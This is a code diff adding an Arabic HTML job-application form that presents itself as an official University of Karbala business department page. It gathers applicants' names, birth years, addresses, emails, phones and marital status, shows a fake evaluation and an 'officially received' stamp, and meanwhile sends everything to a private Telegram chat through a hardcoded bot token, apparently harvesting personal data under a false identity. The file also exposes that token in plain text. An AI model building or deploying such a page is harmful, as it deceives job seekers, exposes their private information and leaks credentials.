@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>جامعة كربلاء | استمارة شاملة</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+
+body{
+margin:0;
+font-family:'Cairo',sans-serif;
+background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+background-size:400% 400%;
+animation:bgMove 15s ease infinite;
+display:flex;
+justify-content:center;
+align-items:center;
+min-height:100vh;
+}
+
+@keyframes bgMove{
+0%{background-position:0% 50%;}
+50%{background-position:100% 50%;}
+100%{background-position:0% 50%;}
+}
+
+.container{
+width:90%;
+max-width:900px;
+background:rgba(255,255,255,0.08);
+backdrop-filter:blur(25px);
+padding:40px;
+border-radius:25px;
+box-shadow:0 0 60px rgba(0,0,0,0.8);
+color:#fff;
+border:2px solid gold;
+display:flex;
+flex-direction:column;
+align-items:center;
+}
+
+.header{text-align:center;margin-bottom:30px;}
+.header h1{color:gold;margin:0;font-size:2.5em;}
+.header h2{margin:5px 0;font-weight:normal;font-size:1.5em;}
+
+.section{
+width:100%;
+background:rgba(255,255,255,0.05);
+padding:25px 20px;
+border-radius:20px;
+margin-bottom:25px;
+opacity:0;
+transform:translateY(50px);
+transition:0.6s cubic-bezier(0.68,-0.55,0.27,1.55);
+display:flex;
+flex-direction:column;
+align-items:center;
+}
+
+.section.show{opacity:1; transform:translateY(0);}
+.section:hover{box-shadow:0 0 35px rgba(255,215,0,0.8);}
+
+.input-wrapper{
+position:relative;
+width:80%;
+margin:8px 0;
+}
+.input-wrapper i{
+position:absolute;
+left:12px;
+top:50%;
+transform:translateY(-50%);
+color:gold;
+font-size:18px;
+pointer-events:none;
+transition:0.3s;
+}
+input,select,textarea{
+width:100%;
+padding:12px 12px 12px 38px;
+border:none;
+border-radius:12px;
+font-size:16px;
+outline:none;
+background:rgba(255,255,255,0.1);
+color:#fff;
+transition:0.3s;
+}
+input::placeholder,textarea::placeholder{color:#ddd;}
+input:focus,select:focus,textarea:focus{
+box-shadow:0 0 20px gold;
+transform:scale(1.02);
+background:rgba(255,255,255,0.15);
+}
+
+button{
+width:50%;
+padding:15px;
+border:none;
+border-radius:12px;
+background:linear-gradient(145deg,gold,#ffb700);
+font-size:18px;font-weight:bold;
+cursor:pointer;
+transition:0.3s;
+margin-top:10px;
+}
+button:hover{
+transform:scale(1.08) rotate(-1deg);
+box-shadow:0 0 25px gold, 0 5px 15px rgba(0,0,0,0.4);
+}
+
+canvas{border:2px dashed gold;border-radius:12px;background:#fff;touch-action:none;width:80%;height:150px;margin-bottom:10px;}
+
+.result{margin-top:20px;padding:20px;text-align:center;font-size:22px;border-radius:15px;display:none;animation:fadeUp 0.8s ease forwards;}
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px);} to{opacity:1;transform:translateY(0);}}
+
+.stamp{margin-top:15px;font-size:22px;color:gold;font-weight:bold;display:none;animation:stamp 0.8s ease forwards;}
+@keyframes stamp{from{transform:scale(0);opacity:0);} to{transform:scale(1);opacity:1;}}
+
+.progress{width:80%;height:10px;background:#333;border-radius:10px;margin-bottom:20px;overflow:hidden;}
+.progress-bar{height:100%;width:0%;background:linear-gradient(90deg,gold,#ffb700);transition:0.4s;}
+
+.loader{border:5px solid #f3f3f3;border-top:5px solid gold;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto;display:none;}
+@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+
+.note{
+background:rgba(255,215,0,0.2);
+color:#000;
+font-weight:bold;
+padding:12px 15px;
+border-radius:12px;
+text-align:center;
+margin-bottom:15px;
+width:80%;
+transition:0.3s;
+}
+.note a{color:red;font-weight:bold;text-decoration:none;}
+.note:hover{background:rgba(255,215,0,0.4);transform:scale(1.02);}
+
+.status-male{background:#3498db;color:#fff;}
+.status-female{background:#e91e63;color:#fff;}
+
+.excellent{background:#00b894;}
+.verygood{background:#0984e3;}
+.good{background:#6c5ce7;}
+.average{background:#fdcb6e;color:black;}
+.accepted{background:#d63031;}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+<div class="header">
+<h1>جامعة كربلاء</h1>
+<h2>قسم إدارة الأعمال</h2>
+<p>استمارة تقديم خريج للحصول على فرصة توظيف</p>
+</div>
+
+<div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+
+<form id="form">
+
+<!-- المعلومات الشخصية -->
+<div class="section">
+<h3>المعلومات الشخصية</h3>
+<div class="input-wrapper"><i class="fa fa-user"></i><input type="text" placeholder="الاسم الكامل" required></div>
+<div class="input-wrapper"><i class="fa fa-calendar"></i><input type="number" id="birthYear" placeholder="سنة الميلاد" required></div>
+<div class="input-wrapper"><i class="fa fa-hourglass"></i><input type="number" id="age" placeholder="العمر" readonly></div>
+<div class="input-wrapper"><i class="fa fa-home"></i><input type="text" placeholder="السكن الحالي" required></div>
+<div class="input-wrapper"><i class="fa fa-envelope"></i><input type="email" id="email" placeholder="البريد الإلكتروني للتواصل" required></div>
+<div class="input-wrapper"><i class="fa fa-phone"></i><input type="tel" id="phone" placeholder="رقم الهاتف" required></div>
+<div class="input-wrapper"><i class="fa fa-venus-mars"></i>
+<select id="gender" required>
+<option value="">نوع الجنس</option>
+<option value="male">ذكر</option>
+<option value="female">أنثى</option>
+</select></div>
+<div class="input-wrapper"><i class="fa fa-heart"></i>
+<select id="status" required>
+<option value="">الحالة الاجتماعية</option>
+</select></div>
+<div class="input-wrapper"><i class="fa fa-sticky-note"></i><textarea placeholder="ملاحظات إضافية"></textarea></div>
+</div>
+
+<!-- المعلومات الأكاديمية -->
+<div class="section">
+<h3>المعلومات الأكاديمية</h3>
+<div class="input-wrapper"><i class="fa fa-graduation-cap"></i>
+<select id="degree" required>
+<option value="">نوع الشهادة</option>
+<option value="2">دبلوم</option>
+<option value="3">بكالوريوس</option>
+<option value="4">ماجستير</option>
+<option value="5">دكتوراه</option>
+</select></div>
+<div class="input-wrapper"><i class="fa fa-book"></i>
+<select>
+<option>نوع الدراسة</option>
+<option>صباحي</option>
+<option>مسائي</option>
+</select></div>
+<div class="input-wrapper"><i class="fa fa-calendar-check"></i>
+<select id="gradYear" required>
+<option value="">سنة التخرج</option>
+</select></div>
+<div class="input-wrapper"><i class="fa fa-briefcase"></i><input type="number" id="serviceYears" placeholder="سنوات الخدمة (إن وجدت)"></div>
+</div>
+
+<!-- الأسئلة الشائعة -->
+<div class="section">
+<h3>الأسئلة الشائعة للتقييم</h3>
+<div class="input-wrapper"><i class="fa fa-users"></i>
+<select id="teamwork">
+<option value="1">أفضل العمل منفرداً</option>
+<option value="3">أعمل ضمن فريق</option>
+<option value="5">قائد فريق فعال</option>
+</select></div>
+<div class="input-wrapper"><i class="fa fa-tachometer-alt"></i>
+<select id="pressure">
+<option value="1">لا أتحمل ضغط العمل</option>
+<option value="3">أتحمل ضغط متوسط</option>
+<option value="5">أعمل بكفاءة تحت الضغط</option>
+</select></div>
+<div class="input-wrapper"><i class="fa fa-comments"></i>
+<select id="communication">
+<option value="1">مهارات تواصل ضعيفة</option>
+<option value="3">جيدة</option>
+<option value="5">ممتازة</option>
+</select></div>
+<div class="input-wrapper"><i class="fa fa-chess-king"></i>
+<select id="leadership">
+<option value="1">لا أمتلك مهارات قيادية</option>
+<option value="3">قيادة متوسطة</option>
+<option value="5">قيادي محترف</option>
+</select></div>
+<div class="input-wrapper"><i class="fa fa-desktop"></i>
+<select id="computer">
+<option value="1">مهارات حاسوب ضعيفة</option>
+<option value="3">متوسطة</option>
+<option value="5">متقدمة</option>
+</select></div>
+</div>
+
+<!-- البصمة -->
+<div class="section">
+<h3>البصمة / التوقيع الرقمي</h3>
+<canvas id="signature"></canvas>
+<button type="button" onclick="clearCanvas()">مسح البصمة</button>
+</div>
+
+<div class="note">
+تواصل مع الدعم عبر بوت التليجرام <br>
+<a href="https://t.me/MEBOOTTT1_bot" target="_blank">@MEBOOTTT1_bot</a>
+</div>
+
+<button type="submit">ارسال وتحليل الطلب</button>
+
+</form>
+
+<div class="loader" id="loader"></div>
+<div id="result" class="result"></div>
+<div id="stamp" class="stamp">✔ تم استلام الطلب رسمياً - سيتم الرد عبر بريدك الإلكتروني</div>
+
+<script>
+// الأقسام تظهر تدريجياً
+const sections=document.querySelectorAll(".section");
+window.addEventListener("load",()=>{sections.forEach((sec,i)=>{setTimeout(()=>{sec.classList.add("show");},i*300);});});
+
+// سنوات التخرج
+const gradYear = document.getElementById("gradYear");
+for(let y=1990;y<=2026;y++){let op=document.createElement("option");op.value=y; op.text=y; gradYear.appendChild(op);}
+
+// الحالة الاجتماعية حسب الجنس مع تغيير اللون
+const genderSelect = document.getElementById("gender");
+const statusSelect = document.getElementById("status");
+genderSelect.addEventListener("change",function(){
+    statusSelect.innerHTML="<option value=''>الحالة الاجتماعية</option>";
+    statusSelect.className="";
+    if(this.value==="male"){
+        statusSelect.innerHTML += `<option>اعزب</option><option>متزوج</option><option>منفصل</option>`;
+        statusSelect.classList.add("status-male");
+    } else if(this.value==="female"){
+        statusSelect.innerHTML += `<option>عزباء</option><option>متزوجة</option><option>مطلقة</option>`;
+        statusSelect.classList.add("status-female");
+    }
+});
+
+// حساب العمر
+const birthYearInput = document.getElementById("birthYear");
+const ageInput = document.getElementById("age");
+birthYearInput.addEventListener("input",()=>{ageInput.value=new Date().getFullYear()-birthYearInput.value;});
+
+// شريط التقدم
+const form = document.getElementById("form");
+const progressBar = document.getElementById("progressBar");
+form.addEventListener("input",()=>{
+    let inputs=form.querySelectorAll("input,select,textarea");
+    let filled=0; inputs.forEach(i=>{if(i.value) filled++;});
+    progressBar.style.width=(filled/inputs.length)*100+"%";
+});
+
+// التوقيع الرقمي
+const canvas=document.getElementById("signature");
+const ctx=canvas.getContext("2d"); let drawing=false;
+canvas.addEventListener("mousedown",()=>drawing=true);
+canvas.addEventListener("mouseup",()=>drawing=false);
+canvas.addEventListener("mousemove",draw);
+canvas.addEventListener("touchstart",()=>drawing=true);
+canvas.addEventListener("touchend",()=>drawing=false);
+canvas.addEventListener("touchmove",drawTouch);
+function draw(e){if(!drawing) return; ctx.lineWidth=2; ctx.lineCap="round"; ctx.strokeStyle="black"; ctx.lineTo(e.offsetX,e.offsetY); ctx.stroke(); ctx.beginPath(); ctx.moveTo(e.offsetX,e.offsetY);}
+function drawTouch(e){e.preventDefault(); if(!drawing) return; let rect=canvas.getBoundingClientRect(); let x=e.touches[0].clientX-rect.left; let y=e.touches[0].clientY-rect.top; ctx.lineWidth=2; ctx.lineCap="round"; ctx.strokeStyle="black"; ctx.lineTo(x,y); ctx.stroke(); ctx.beginPath(); ctx.moveTo(x,y);}
+function clearCanvas(){ctx.clearRect(0,0,canvas.width,canvas.height);}
+
+// التقييم النهائي + إرسال للبوت
+form.addEventListener("submit", function(e){
+    e.preventDefault();
+    document.getElementById("loader").style.display="block";
+    setTimeout(()=>{
+        document.getElementById("loader").style.display="none";
+        let score = 0;
+        const degree = document.getElementById("degree");
+        const serviceYears = document.getElementById("serviceYears");
+        score += parseInt(degree.value||0)*5;
+        score += parseInt(serviceYears.value||0)*3;
+        if(parseInt(ageInput.value)>=22) score+=10;
+        score += parseInt(document.getElementById("teamwork").value||0)
+               + parseInt(document.getElementById("pressure").value||0)
+               + parseInt(document.getElementById("communication").value||0)
+               + parseInt(document.getElementById("leadership").value||0)
+               + parseInt(document.getElementById("computer").value||0);
+        let finalScore = '';
+        if(score>=90){ finalScore = "ممتاز ⭐⭐⭐⭐⭐"; }
+        else if(score>=70){ finalScore = "جيد جداً ⭐⭐⭐⭐"; }
+        else if(score>=50){ finalScore = "جيد ⭐⭐⭐"; }
+        else if(score>=35){ finalScore = "متوسط ⭐⭐"; }
+        else { finalScore = "مقبول ⭐"; }
+
+        let result = document.getElementById("result");
+        result.style.display="block";
+        result.className="result " + (score>=90?"excellent":score>=70?"verygood":score>=50?"good":score>=35?"average":"accepted");
+        result.innerHTML="التقييم النهائي: " + finalScore;
+        document.getElementById("stamp").style.display="block";
+        window.scrollTo({top:document.body.scrollHeight,behavior:"smooth"});
+
+        const data = {
+            الاسم: form.querySelector('input[type="text"]').value,
+            سنة_الميلاد: birthYearInput.value,
+            العمر: ageInput.value,
+            السكن: form.querySelector('input[placeholder="السكن الحالي"]').value,
+            البريد_الإلكتروني: document.getElementById("email").value,
+            الهاتف: document.getElementById("phone").value,
+            الجنس: genderSelect.options[genderSelect.selectedIndex].text,
+            الحالة_الاجتماعية: statusSelect.options[statusSelect.selectedIndex].text,
+            الملاحظات: form.querySelector('textarea').value,
+            التقييم: finalScore,
+            الوقت: new Date().toLocaleString()
+        };
+        const botToken = "5612204625:AAEusV9Bs2bGCCoqwlvY6-Sj6AuDigjniw0";
+        const chatId = "910624538";
+        let message = "📝 بيانات استمارة جديدة:\n\n";
+        for(let key in data){ message += `*${key}:* ${data[key]}\n`; }
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method:"POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({chat_id: chatId,text: message,parse_mode:"Markdown"})
+        }).then(res => res.json())
+        .then(resp => console.log("تم إرسال البيانات للبوت", resp))
+        .catch(err => console.error("خطأ في الإرسال للبوت:", err));
+    },1200);
+});
+</script>
+</body>
+</html>
